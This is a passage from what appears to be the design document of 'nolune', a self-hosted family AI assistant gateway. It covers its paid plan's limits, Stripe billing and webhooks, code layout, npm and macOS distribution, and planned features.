  and the plan's credits cost less than OpenRouter's (see [Payments](#payments)), which makes them
  worth reselling: one subscription per account and per card (Radar's card fingerprint), and the
  windows keep what one subscription can pass on to what it was given.

### What the family sees

- **Over a limit**, the API answers `429` with OpenAI's error shape, the limit and when it starts
  again: `{ "error": { "code": "five_hour_limit", "message": …, "resets_at": … } }` (or
  `weekly_limit`, `background_share`, `credits_spent`). It adds `x-should-retry: false`, since the
  SDKs retry a 429 themselves and don't wait out a `Retry-After` of hours. nolune makes it a
  `PlanError` with that `kind`, in words, as the ChatGPT plan's usage limit is said: "nolune's
  5-hour limit is reached; chats start again at 18:40. An admin can turn on extra credits in Models
  & keys."
- **Usage, live.** Every response carries how much of each limit is used and when it starts again
  (`x-nolune-usage`), and `GET /v1/usage` says the same. The gateway keeps the latest and sends it
  to open pages: Models & keys shows all three, and from 80% the composer says "5 hours: 85% ·
  again at 18:40".
- **Automations** refused by a limit don't fail: the run waits and starts again when the limit
  does, and the bell says so once. A subagent refused by one ends with the error, which its parent
  hears from `nolune agent watch`.
- **Pictures.** `nolune generate image` asks for the plan's usage before it says it has started, as
  it checks a key now, so a refused picture is said at once rather than after the wait.

### Trust and terms

- **Who sees the chats.** With a key, requests go from this computer to the provider; on the plan
  they pass through nolune's API, which could read them, as the relay could (see
  [The relay](#the-relay)). It logs only what it bills (time, model, tokens, cost, the account),
  never what was said; OpenRouter and the model's maker see requests as they do with an OpenRouter
  key. The welcome and Models & keys say so where the plan is offered.
- **Regions.** The API serves only the countries its upstreams serve, and refuses others with a
  page saying so. The plan isn't a way around a provider's regions, and one family's misuse would
  cost every family its access.

### Payments

Triangle Interactive, LLC sells the plan, through Stripe.

- **The catalog.** Two products, in the same Stripe account as Gensprite's and named the same way:
  `nolune Family` ($20 a month, its price's lookup key `nolune-plan-family`) and
  `nolune extra credits` ($10 once, `nolune-pack-10`). What each grants is in its metadata, in
  cents: `credits_cents` (2500 and 1000), the plan's `limit_5h_cents`, `limit_week_cents` and
  `rollover_cap_cents`, the pack's `expires_in_days`, and `offer: launch` while the launch offer
  lasts (below). The API reads them from the product of what
  was paid, so another tier is another product rather than new code. Checkout finds prices by their
  lookup keys.
- **A launch offer.** Credits are model use at OpenRouter's prices, and to win families they start
  out worth more than they cost: $25 for a $20 plan, $10 for a $10 pack. With Stripe's and Managed
  Payments' fees and OpenRouter's on buying credits, a family that spends every credit costs about
  $8 a month more than it pays, and a pack about $1.50; credits nobody spends cost nothing. It's
  called what it is everywhere it's sold: the products' descriptions at Checkout, the account page,
  and Models & keys ("Launch offer: $25 of credits for $20"), from `offer: launch`. Ending it is
  the products' metadata, not new prices: families are told a month ahead, and their periods after
  that get the new amounts. Credits already given and packs already bought keep theirs.
- **Buying.** The account page on nolune.dev opens Stripe Checkout for a tier (a monthly Price for
  each) and Stripe's customer portal for changing the tier or the card, or cancelling. Extra
  credits are a one-time Checkout payment. Nothing is billed for use afterwards: the month's credits
  come with the subscription and extra credits are paid before they're spent, so there's never an
  invoice for tokens already used, or one that fails after they were.
- **Credits follow Stripe's events**, at the API's webhook endpoint. `invoice.paid` grants the
  period's credits; `customer.subscription.updated` moves the tier (an upgrade at once, Stripe
  invoicing the prorated difference, whose `invoice.paid` grants the same share of the new tier's
  credits; a downgrade at the period's end); `customer.subscription.deleted`, sent when a
  cancelled subscription runs out, ends the plan; `checkout.session.completed` adds extra credits.
  Each event is checked by its signature and applied once, by its id, since Stripe may send one
  more than once.
- **A failed payment** (`invoice.payment_failed`) leaves the plan what's left of its credits but
  gives it no new ones while Stripe retries. Models & keys says so, with the portal's link.
- **The API keeps its own ledger.** Stripe knows money, not windows: the 5-hour and weekly limits
  are checked before every request, so the API keeps the credits, the windows and each request's
  cost itself, and Stripe never sees tokens. Stripe's LLM token billing (a private preview in 2026,
  which meters tokens through OpenRouter with a markup) bills use afterwards, which a prepaid plan
  doesn't need.
- **Sales tax and VAT.** The EU and the UK tax digital services sold to people there from the
  first sale, for a seller outside them. Stripe Managed Payments makes Stripe the merchant of
  record, which collects and pays those in over 80 countries: it's switched on in the Dashboard,
  and each Checkout Session sets `managed_payments[enabled]`. It takes AI services since June 2026,
  so both products have the tax code `txcd_10105001` (AI as a service, cloud based, personal use).
  It sells to nobody in the countries Stripe restricts, Russia among them, which fits the API's
  regions.
- **Stripe and OpenRouter.** Stripe agreed to buy OpenRouter in August 2026. Gateways only know
  nolune's API, so whatever changes at OpenRouter is the API's to follow.

### Open questions

- More tiers, once Family's use is known.
- Shares for each member of a family. The API knows only the gateway, so the gateway would count
  them (it knows who started each turn), from what each response says it cost (`x-nolune-cost`).
- Whether background work's share should be an admin's setting.
- When the launch offer ends, and whether packs need a cap a month meanwhile: each one costs more
  than it brings in, and nothing limits how many one account buys.

## Code layout

```
packages/core   @nolune/core. Schema + migrations, config, skills, prompt, run_command, background
                commands, auto mode (command-safety.ts, read-only-commands.ts), memory notes (search and recall, learning from chats, cards in memory-cards.ts, and
                memory-export.ts, memory-import.ts: memories brought over from another
                assistant), new-chat suggestions, nolune view images, attachments, model
                calls (models.ts, with anthropic.ts, openai-chat.ts and openrouter.ts, each with
                its Files API and the function that turns nolune's format, format.ts, into its
                request, and custom-providers.ts, your own servers in either API),
                plans (plans.ts: the Claude plan's turns through Claude Code in claude-plan.ts; the
                ChatGPT plan's requests in chatgpt-plan.ts, signed in with Sign in with ChatGPT in
                chatgpt-sign-in.ts), provider
                file cache, runner, media, users/invites/profiles/presets, API
                keys, chat folders, triggers, scheduler, subagents (subagents.ts, and
                subagent-host.ts in the gateway), notifications, image generation (providers:
                openai.ts), image templates and assistant avatars.
                Built-in skills in packages/core/skills, built-in templates in
                packages/core/image-templates. Plain TypeScript run by Node with type stripping
                (no enums or parameter properties; imports use .ts extensions).
packages/cli    nolune: setup, start, service, relay (relay.ts), config, key, claude-plan, chatgpt-plan (plans.ts), env,
                user, preset, profile, skill, trigger, wake, view, memory, card, generate, agent. `runCli(argv, io)` in run.ts runs a command and returns
                its exit code; index.ts calls it with this process's io. Commands print, read stdin,
                the environment (NOLUNE_PROFILE, …) and the working folder only through `io` (io.ts),
                never `process`, and end in an error rather than `process.exit`, so the agent's
                commands can run inside the gateway: index.ts asks it first (client.ts, over
                protocol.ts), and serve.ts is the gateway's side. setup, start and service stay in a
                process of their own: they prompt at a terminal, run the gateway or manage its
                service.
packages/web    SvelteKit gateway (adapter-node). @nolune/core is bundled into the server build.
                UI components in src/lib/components (shadcn-svelte primitives in ui/, a new
                profile's welcome in welcome/, its sounds in src/lib/welcome), the interface's
                languages in src/lib/i18n.
packages/api    @nolune/api. nolune's API for the nolune plan (see [The nolune
                plan](#the-nolune-plan)), a SvelteKit app (adapter-node) on Postgres with
                drizzle (migrations in packages/api/drizzle, run when it starts). So far: accounts
                with better-auth (auth.ts: codes by email, email.ts through Resend; device codes
                for gateways; bearer tokens), the plan's credits and limits (limits.ts, kept by
                accounts.ts), the pages (sign-in, link, the plan) and /v1/usage. Its tests run on
                PGlite, Postgres in the test's own process. Deployed next to the relay, not part
                of the npm package.
packages/relay  @nolune/relay. The relay server (relay.ts, with its gateways file, store.ts, and its
                pages), and what the gateway shares with it: the protocol (protocol.ts), a WebSocket
                as a byte stream (stream.ts) and the headers that go on to the next hop
                (headers.ts). Deployed on its own (Dockerfile, compose.yaml with Caddy), not
                part of the npm package; the CLI bundles only the shared files.
scripts/        build-cli.mjs bundles the CLI and core into dist/cli.js with esbuild.
macos/          nolune.app: the SwiftUI onboarding, the gateway's keeper and the menu bar
                extra (see [The macOS app](#the-macos-app)); scripts/build-app.sh bundles it.
```

Core finds the package root by walking up to the `package.json` named `nolune`. That works
from source, from the SvelteKit build and from the bundled CLI, and gives the paths to the
migrations, `packages/web/build/index.js` and the CLI entry.

## Distribution

Published to npm as `nolune` from a `v*` tag by `.github/workflows/publish.yml`, with npm trusted
publishing (see Publishing in the README). `npm install -g nolune` gives the `nolune` command. The
same tag builds [the macOS app](#the-macos-app) for Apple silicon and Intel, signed and notarized,
into a GitHub release, with notes Claude writes from the commits since the last tag (see Publishing
in docs/development.md).

- The package ships `packages/web/build/` (the web app, without its source maps, which Node doesn't load unless
  asked to and which are most of its size), `dist/cli.js` with its `dist/chunks`,
  `packages/core/drizzle`, the built-in skills in `packages/core/skills` and the built-in image
  templates in `packages/core/image-templates`. Its only runtime dependency is `better-sqlite3` (a
  native module with prebuilt binaries). Everything else is bundled. Node won't strip types inside
  `node_modules`, which is why the CLI ships as JavaScript.
  Claude Code itself isn't shipped (see [The Claude plan](#the-claude-plan)); the Agent SDK and
  zod, which core loads on first use, are in chunks of their own.
- `nolune setup` is the first-run wizard: config, admin account, and the address: the relay
  (asked at a terminal, `--relay` / `--no-relay` otherwise; no without either), else a public URL.
  It adds no key or model: a new profile's welcome asks the admin for them when there's no preset.
- `nolune start` reads host, port and origin from `config.json` (default `127.0.0.1:5780`), sets
  `HOST` / `PORT` / `ORIGIN` for adapter-node and imports `packages/web/build/index.js`, then
  connects to the relay when there's one.
- `nolune service install` writes a LaunchAgent (`~/Library/LaunchAgents/dev.nolune.gateway.plist`)
  that runs `node dist/cli.js start` with `KeepAlive` and logs to `~/.nolune/logs/gateway.log`.
  It's a LaunchAgent, not a LaunchDaemon, so commands run as the user. It records the absolute
  node path, so switching Node versions needs a reinstall.
- On Linux it writes a systemd user unit (`~/.config/systemd/user/nolune.service`) instead, for the
  same reason, with `Restart=always` and `RestartSec=10` for `KeepAlive` and `ThrottleInterval`,
  logging to the same file (`Type=exec` and `append:` need systemd 240). User services run from
  the first login to the last logout unless the user lingers, so install runs
  `loginctl enable-linger`, which logind allows for yourself on most systems, and prints the `sudo`
  command when it can't. Unit files expand `%` specifiers everywhere and `$NAME` in ExecStart's
  arguments (not its program path), so the unit doubles those.
- On shutdown, the gateway kills the process groups of commands that are still running.
- Remote access is nolune's relay (see [The relay](#the-relay)) or the user's own tunnel (Tailscale
  Funnel, Cloudflare Tunnel, a VPS). The gateway only binds to localhost by default.
- macOS privacy (TCC): the background `node` process needs Full Disk Access to reach Documents,
  Desktop, Photos and Mail. Setup prints the path. Granting it applies to everything that node
  binary runs. The macOS app avoids that: its switch is named nolune and covers only nolune.

## The macOS app

`nolune.app` (`macos/`, built by `macos/scripts/build-app.sh`, checked by
`.github/workflows/macos.yml`) is nolune without a Terminal: a SwiftUI launcher with its own Node
and the npm package installed in `Contents/Resources/app`. See `macos/README.md` for building and
signing.

- **First run.** A big bang, about four seconds (`IntroView.swift`): in the dark a point of light
  gathers and bursts in a flash and a shock wave, the song starts, and the stars fly out of it,
  fast then settling (IntroSky.svelte's sky in `Sky.swift`, with a `burst`), the eight colors
  after them, pooling into the glow. The full intro, with the wordmark, stays the web welcome's,
  which the admin sees next, so it isn't played twice. Then three steps with the web welcome's look (Figtree, the off-white pill, the progress
  bars): the admin account (`nolune setup`, with a generated password to keep; skipped when an
  admin exists), Full Disk Access, and the gateway started. Opened from the DMG (or translocated
  from Downloads), it first offers to move itself to Applications (`Relocation.swift`), since it
  opens at login from wherever it is. A relaunch
  halfway (System Settings' "Quit & Reopen") comes back to the step it was on, without the intro.
- **The gateway runs with the app.** No LaunchAgent: the app starts its own executable with
  `--gateway` as its child when it opens (`Service.swift`), and stops it when it quits; the app
  opens at login (`SMAppService.mainApp`), so nolune is up whenever it's in the menu bar, and only
  then. The keeper (`Gateway.swift`) runs `node cli.js start` with a clean signal state (posix_spawn,
  as Foundation's Process would pass on a dispatch thread's blocked signals), starts it again at
  once on SIGHUP and after a growing pause (1 s to 30 s) when it stops by itself, stops it on
  SIGTERM, and when the app is gone (its parent changes), and keeps its pid in
  `$NOLUNE_HOME/gateway.pid`. macOS charges file access to the app, and its children count as it,
  so the gateway and the commands it runs are nolune's for Full Disk Access, and the grant
  survives updates (the signature, not the file, is what's matched). The CLI knows the app's Node
  (`appManaged` in service.ts): `nolune service restart` sends the keeper SIGHUP, `status` asks
  whether it runs, and install and uninstall point to the app. The app removes a LaunchAgent with
  the gateway's label (`nolune service install`'s) when it starts one, since two would fight over
  the port.
- **Full Disk Access.** No API asks for it. The step opens the pane, tries a few protected files
  (the privacy databases, Time Machine's settings, Safari's and Mail's folders: none is on every
  Mac, so any one that reads is the answer; trying them usually lists the app, switched off),
  offers the app's icon to drag in, and checks every second in a fresh `--probe-disk-access`
  process, since a running one may not see the grant until it relaunches. When the switch goes
  on, the step's own big switch flips with it and the aurora swells.
- **After.** A menu bar extra: whether the gateway answers, the people with accounts, the address,
  open, restart, the log, and Quit, which stops nolune. Opening the app again opens nolune in the
  browser.
- **The DMG** (`macos/dmg/`) opens to nolune and Applications side by side, their icons at 128
  points, over a planet's rim in deep space, its air in three of the avatar colors as the app
  icon's aurora, with a dotted arrow between them and "Drag nolune to Applications" under. Finder
  names the icons in black or white with the Mac's appearance, so the names sit on the rim's lit
  edge, a mid-tone both read on. dmgbuild writes the window's layout into the image's `.DS_Store`
  rather than scripting Finder, which needs a logged-in session.

## Not done yet

- Cards: notes shared on purpose between profiles, for people who aren't users (a grandmother in
  the family's profile and in Anna and her mother's), only between profiles the person sharing is
  in; and a switch for an owner to stop the agent and the note-taker from writing their card.
- **Compaction.** The context window is already stored on each conversation and shown in the UI.
  The next step is server-side compaction (beta `compact-2026-01-12`), triggered at about 85% of the
  window.
- Other chat providers (Gemini). See [Model providers](#model-providers) for what each needs.
- OpenRouter: provider preferences (`provider.order`, data policy), and PDFs for models that don't
  read them, through OpenRouter's parser with its annotations sent back so a PDF is parsed once.
- The Claude plan: deleting a chat's Claude Code session with the chat (the SDK has
  `deleteSession`); messages sent mid-turn joining at Claude Code's next step (its input stream
  takes them) rather than after the turn.
- The ChatGPT plan: "Using ChatGPT plan" with a Manage usage link by the composer, as OpenAI's UI
  guidelines ask; a ChatGPT account per profile (each would be a registration of its own, which
  Sign in with ChatGPT allows).
- Other image providers (OpenRouter, fal, Higgsfield): a module each next to `openai.ts` and an entry
  in `PROVIDERS`, plus one in `API_KEYS` (config.ts) and a check request in `api-keys.ts`.
- Auto mode: house rules an admin writes for the check (Claude Code's environment, block and allow
  slots), a probe that warns the agent about prompt injection in what its commands print, and a
  look at everything a subagent did when it hands back its result.
- Refusal fallbacks (`fallbacks: "default"`) for models that support them. Refusals are shown in the UI today.
- Push notifications (Web Push) for the bell. Today it only updates while a page is open.
- A `nolune notify` command for scripts that only need to say something, without waking the agent.
- End-to-end encryption through the relay (see [The relay](#the-relay)).
- The nolune plan: a subscription to nolune that covers chats, pictures and embeddings, with 5-hour
  and weekly limits (see [The nolune plan](#the-nolune-plan)).
